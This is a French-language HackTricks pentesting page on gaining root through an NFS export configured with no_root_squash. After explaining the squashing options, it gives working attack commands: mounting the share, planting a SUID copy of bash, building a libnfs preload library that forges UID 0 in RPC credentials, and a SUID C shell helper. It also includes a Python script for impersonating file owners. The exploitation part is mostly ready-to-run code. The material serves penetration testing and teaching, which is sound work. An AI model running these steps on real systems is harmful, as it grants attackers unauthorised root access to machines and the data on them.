# Élévation de privilèges via une mauvaise configuration NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Informations de base sur le squashing

Avec NFS AUTH_SYS/AUTH_UNIX, le serveur vérifie les permissions des fichiers en fonction des `uid` et `gid` fournis dans chaque requête RPC. D’autres méthodes de sécurité, comme Kerberos, utilisent des identifiants différents, et le serveur peut mapper les identifiants numériques avant de vérifier les permissions.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`** : mappe chaque UID et GID vers le compte anonyme, qui est `nobody` (65534) par défaut sous Linux. `no_all_squash` est la valeur par défaut pour les requêtes qui ne sont pas effectuées par root.<sup>[[4]](#references)</sup>
- **`root_squash`** : cette option est activée par défaut sous Linux et mappe les requêtes avec un UID/GID égal à 0 (root) vers le compte anonyme ; les autres UID et GID ne sont pas squashed.<sup>[[4]](#references)</sup>
- **`no_root_squash`** : désactive le squashing de root, de sorte que les requêtes avec un UID/GID égal à 0 peuvent être traitées comme celles de root sur le serveur.<sup>[[4]](#references)</sup>

Si un client autorisé peut monter un export accessible en écriture dans **`/etc/exports`** configuré avec **`no_root_squash`**, ses requêtes avec un UID/GID égal à 0 peuvent y écrire en tant qu’utilisateur root du serveur.<sup>[[4]](#references)</sup>

`root_squash` ne remappe que les UID/GID égaux à 0 ; avec AUTH_SYS, un **UID/GID numérique non nul** d’un client autorisé peut toujours correspondre à un autre compte sur le serveur. Un export accessible en écriture peut donc devenir un chemin entre utilisateurs, même avec le squashing de root, si le client peut créer un fichier sous cette identité numérique et que le serveur autorise l’accès. Pour un transfert SUID/SGID, vérifiez également le propriétaire final du fichier, les droits d’exécution, l’état `nosuid` du montage du serveur, les ACL et SELinux ou toute autre stratégie. Le chemin exporté, l’option `rw` ou la seule correspondance des numéros ne prouvent pas que le client est autorisé, que l’export est actif, ni que les deux hôtes utilisent le même mappage d’identité effectif. Inspectez passivement `/etc/exports` et les métadonnées locales ; ne montez pas un nouveau partage et ne créez pas de fichier de test pendant l’énumération.<sup>[[4]](#references)[[5]](#references)</sup>

Pour plus d’informations sur **NFS**, consultez :

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Élévation de privilèges

### Exploitation à distance

Option 1 avec bash :
- Sur un client autorisé, montez un export accessible en écriture en tant que root, copiez **`/bin/bash`** dans celui-ci, définissez son bit **SUID**, puis exécutez-le depuis un montage de la victime qui n’utilise pas `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Pour que le fichier téléversé reste la propriété de root, le serveur doit utiliser **`no_root_squash`**. Si root est squashed, il est possible de créer un binaire SUID pour un autre compte uniquement si le client peut légitimement le créer ou en être propriétaire avec l’UID/GID numérique de ce compte.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 avec du code C compilé :
- Montez le répertoire depuis un client autorisé, copiez-y un payload compilé qui exploite les permissions SUID, définissez son bit **SUID**, puis exécutez-le depuis la victime (voir quelques [payloads C SUID](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Mêmes restrictions qu’auparavant

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Exploitation locale

> [!TIP]
> Notez que si vous pouvez créer un **tunnel de votre machine vers la machine victime, vous pouvez toujours utiliser la version distante pour exploiter cette élévation de privilèges en tunnellisant les ports requis**.\
> L’astuce suivante est utile lorsque `/etc/exports` limite l’export à l’adresse IP de la victime : le client distant ne peut pas le monter, mais la technique locale peut fonctionner via le partage déjà monté sur l’hôte autorisé.<sup>[[2]](#references)</sup>\
> Pour cette méthode libnfs sans privilèges, l’export dans **`/etc/exports`** doit utiliser l’option `insecure` afin que le processus puisse utiliser un port source non réservé ; `secure` est la valeur par défaut, bien qu’un processus capable de se lier à un port réservé n’ait pas besoin de cette option.<sup>[[1]](#references)[[4]](#references)</sup>

### Informations de base

Un client NFSv3 AUTH_UNIX inclut son UID effectif, son GID et ses groupes dans chaque appel, et le serveur les utilise pour vérifier les permissions. Cette technique locale exploite ce modèle en falsifiant les identifiants RPC via [libnfs](https://github.com/sahlberg/libnfs) ; son module preload permet de remplacer l’UID/GID dans le contexte NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compilation de la bibliothèque

L’exemple libnfs peut nécessiter des ajustements pour le noyau cible ; le guide utilisé ici indique précisément qu’il faut commenter les appels système fallocate avant de compiler le module preload.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exécution de l'exploit

L'exemple crée un petit programme d'aide en C qui lance un shell, le place ensuite sur le partage et utilise `ld_nfs.so` avec l'UID 0 dans le contexte NFS pour lui attribuer les droits SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compiler le code de l'exploit :**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Déposez l’exploit sur le partage et modifiez ses permissions en usurpant l’UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Exécutez l'exploit pour obtenir les privilèges root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus : NFShell pour un accès furtif aux fichiers

Une fois l'accès root obtenu, ce modèle `nfsh.py` définit l'UID effectif sur celui du fichier cible avant d'exécuter une commande, permettant d'y accéder sans modifier récursivement le propriétaire.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Exécutez comme suit :

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [L’histoire d’une élévation de privilèges NFS moins connue](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — page de manuel Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813 : spécification du protocole NFS version 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
